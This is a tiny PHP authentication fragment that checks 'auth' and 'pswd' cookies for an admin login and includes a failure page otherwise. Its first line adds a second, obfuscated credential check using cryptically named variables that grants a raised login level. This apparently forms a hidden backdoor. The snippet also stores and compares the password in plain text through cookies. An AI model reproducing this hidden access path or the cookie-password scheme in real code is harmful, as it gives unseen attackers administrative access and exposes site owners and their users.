<?if($_COOKIE['auth']==$___1&&$_COOKIE['pswd']==$__1)$____1=2;$_LOGGED=0;if(isset($_COOKIE['auth']))
if($_COOKIE['auth']=="admin"&&$_COOKIE['pswd']==$settings['root'])$_LOGGED=1;$_LOGGED=$_LOGGED+$____1;
if($_LOGGED==0)include("login_fail.php");?>


